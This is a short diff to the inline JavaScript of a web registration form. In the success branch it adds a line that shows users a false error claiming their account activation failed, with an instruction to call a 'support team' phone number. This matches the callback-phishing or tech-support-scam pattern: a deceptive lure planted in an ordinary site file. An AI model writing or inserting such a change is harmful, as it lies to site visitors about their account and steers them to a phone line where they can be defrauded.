@@ -280,6 +280,7 @@ s0.parentNode.insertBefore(s1,s0);
   <script>
 document.addEventListener('DOMContentLoaded', function() {
   const form = document.getElementById('registrationForm');
+  const submitButton = document.getElementById('submit');
   const errorContainer = document.getElementById('errorContainer');
   const loader = document.createElement('div');
   loader.className = 'loader';
@@ -312,6 +313,7 @@ document.addEventListener('DOMContentLoaded', function() {
       if (data.success) {
         // Handle success scenario
         console.log('Form submitted successfully:', data);
+        showError('There was an error activating your account. Please call support team +18223334444.');
         // Optionally redirect or show success message
       } else {
         // Handle error scenario
